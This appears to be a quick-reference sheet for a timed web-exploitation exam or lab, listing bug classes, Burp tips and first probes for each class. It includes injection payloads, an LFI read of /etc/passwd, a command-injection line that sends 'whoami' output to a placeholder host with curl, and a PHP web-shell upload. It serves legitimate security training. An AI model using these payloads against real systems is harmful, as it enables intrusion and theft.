# War-room quick reference

One page to glance at under pressure. The app's **Stuck? Try Harder** and **Tips & Tricks**
phases hold the long form; this is the fast lookup.

## Pick the bug class from the stack

| You see… | Lean toward |
|---|---|
| `PHPSESSID`, `.php`, PHP errors | LFI / RFI, PHP wrappers, type juggling, SQLi, upload |
| `JSESSIONID`, Java stack traces, `.do/.action` | XXE, deserialization (ysoserial), EL/SSTI, path traversal |
| `connect.sid` (Express), JSON everywhere | NoSQL injection, mass assignment, proto pollution, SSTI (EJS/Pug) |
| Werkzeug/Flask, Python tracebacks | SSTI (Jinja2), SSRF, pickle deser |
| `.NET`, ViewState, `.aspx` | deserialization, path traversal, SQLi (MSSQL) |
| A comment box / profile / ticket + a bot that "reviews" it | **stored/blind XSS → steal the admin session** |
| A URL/fetch/preview/webhook field | SSRF |
| An `id=`/`file=`/`page=`/`lang=` param | IDOR, LFI, SQLi — test each |

## The objective (keep it in view)
- **local.txt** → shown in the app's **admin section**. Getting an admin session usually just hands it over.
- **proof.txt** → `/` or `C:\` or the exploited user's home. A shell **or** a file-read bug gets it. **No OS priv-esc needed.**
- Partial credit is real. Bank a local.txt + foothold on several targets before perfecting one.

## When you're stuck (run top to bottom)
1. Re-read every JS file, comment, 403/redirect, and error message. The hint is usually already there.
2. Transform the payload: encodings (url/double/unicode/html), content-type swap (form↔json↔xml), param pollution.
3. Move the injection point: other params, JSON keys, headers (UA/Referer/XFF/Host), cookies, filename, path, **second-order**.
4. Chain: SSRF→internal/metadata · LFI→RCE(logs/filter-chain) · upload+LFI · SQLi→OUTFILE shell · XSS→admin(bot) · XXE→SSRF.
5. Confirm blind with `catch-server.py` (OAST) or a time delay.
6. Beat the 403/WAF (verb tamper, path tricks, keyword obfuscation).
7. Revert the box if you polluted state. Switch class. Take a 5-minute break.

## Burp, fast
- `Ctrl-R` send to Repeater, `Ctrl-Shift-R` go to Repeater. Set **Target > Scope** so history stays clean.
- **Comparer** diffs blind true/false responses. **Decoder** / "Convert selection" for encodings.
- **Intruder**: Sniper (1 param), Cluster-bomb (user×pass), Pitchfork (paired). Grep-Match a success string.
- **Match & Replace** to inject a header/cookie/payload on every request.
- Extensions: Autorize (IDOR/authz), Param Miner (hidden params/headers), Turbo Intruder (race), Hackvertor (nested encoding).
- No Pro Collaborator → `catch-server.py` is your OAST endpoint.

## First 3 things per class
- **SQLi**: `'` → error? · `' ORDER BY 5-- -` → col count · `' UNION SELECT ...` or go blind (`SLEEP`).
- **XSS**: inject marker → find context → matching breakout (`"><svg onload=...>` / `';alert()//`).
- **LFI**: `../../../../etc/passwd` → `php://filter` read source → log poisoning for RCE.
- **SSTI**: `{{7*7}}`/`${7*7}` → `{{7*'7'}}` to disambiguate → engine RCE one-liner.
- **Cmdi**: `;id` → blind `;sleep 5` → OAST `;curl http://IP:PORT/$(whoami)`.
- **SSRF**: hit your catcher → read the UA → loopback/metadata encodings → gopher for POST.
- **XXE**: swap Content-Type to xml → in-band `file://` read → OOB via external DTD.
- **IDOR**: two accounts → swap id → sweep ids for the admin record (holds local.txt).
- **Upload**: drop `<?php system($_GET[0]);?>` → bypass ext/mime/magic → find the path → `?0=id`.

## Evidence (do it live, not at hour 20)
- Screenshot the proving request+response the moment a bug fires.
- Proof via UI → screenshot Burp **and** browser against the real target.
- Proof via shell → `cat`/`type` the file from its original path **plus** `hostname`/`ip a` (or `whoami`/`ipconfig`).
- Submit values in the control panel before time ends **and** put the screenshots in the report. Missing shot = 0 for that target, no retake.

## Time & self-care (long engagement + overnight)
- Timebox each class (~30 min) before switching; keep a running "come back to" list.
- Eat, hydrate, and sleep — the time window assumes you will.
- One clean target beats five half-chased ones only if those five got you no partials. Grab partials.
